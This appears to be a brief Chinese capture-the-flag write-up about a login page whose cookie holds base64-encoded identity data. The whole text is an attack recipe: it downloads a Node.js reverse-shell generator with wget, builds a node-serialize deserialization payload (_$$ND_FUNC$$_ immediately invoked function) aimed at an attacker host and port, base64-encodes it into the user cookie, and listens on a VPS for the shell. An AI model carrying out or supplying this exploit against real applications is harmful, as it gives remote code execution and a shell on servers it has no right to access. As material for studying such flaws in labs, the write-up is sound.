一个登录页面，登录后cookie中base64编码的身份信息。
反序列化反弹shell
```

kali中下载所需脚本名为nodejsshell.py：
wget https://raw.githubusercontent.com/ajinabraham/Node.Js-Security-Course/master/nodejsshell.py -o nodejsshell.py

生成 payload ：py2 .\nodejsshell.py x.x.x.x 2333

构造 exp ：{"username":"_$$ND_FUNC$$_function (){ 生成的payload }()","password":"aaa"} –> 进行base64编码

随便登陆一个账户，然后更改 cookie 中 user 的值为 exp 即可（记得 vps 监听端口）
```